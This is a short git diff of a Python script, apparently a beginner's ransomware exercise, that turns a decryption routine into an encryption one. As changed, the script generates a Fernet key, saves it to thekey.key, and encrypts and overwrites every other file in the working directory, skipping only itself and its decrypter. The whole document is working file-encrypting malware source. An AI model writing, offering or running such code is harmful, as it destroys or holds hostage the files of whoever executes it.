@@ -3,20 +3,20 @@ from cryptography.fernet import Fernet
 
 files=[]
 for file in os.listdir():
-    if file == "ramsom.py" or file == "thekey.key" or file == "decrypt.py":
+    if file == "ransom.py" or file == "thekey.key" or file == "decrypt.py":
         continue
     if os.path.isfile(file):
         files.append(file)
         
 print(files)
-#key=Fernet.generate_key()
+key=Fernet.generate_key()
 
-with open("thekey.key","rb") as key:
-    secretkey=key.read()
+with open("thekey.key","wb") as thekey:
+    thekey.write(key)
     
 for file in files:
     with open(file,"rb") as thefile:
         contents = thefile.read()
-    contents_decrypted = Fernet(secretkey).decrypt(contents)
+    contents_encrypted = Fernet(key).encrypt(contents)
     with open(file,"wb") as thefile:
-        thefile.write(contents_decrypted)
+        thefile.write(contents_encrypted)
